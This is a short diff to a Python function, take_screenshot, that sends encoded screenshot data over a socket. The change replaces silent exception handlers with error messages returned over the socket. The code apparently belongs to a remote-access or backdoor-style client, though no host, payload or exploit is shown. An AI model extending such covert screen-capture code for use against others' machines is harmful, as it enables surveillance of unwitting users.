@@ -274,9 +274,11 @@ def take_screenshot(socket) -> bool:
             socket_send(socket, encoded_data)
 
         except IOError as e:
-            pass
+            socket_send(socket, f"[!] Error reading screenshot file: {str(e)}")
+            return False
         except Exception as e:
-            pass
+            socket_send(socket, f"[!] Error processing screenshot: {str(e)}")
+            return False
 
         return True
 
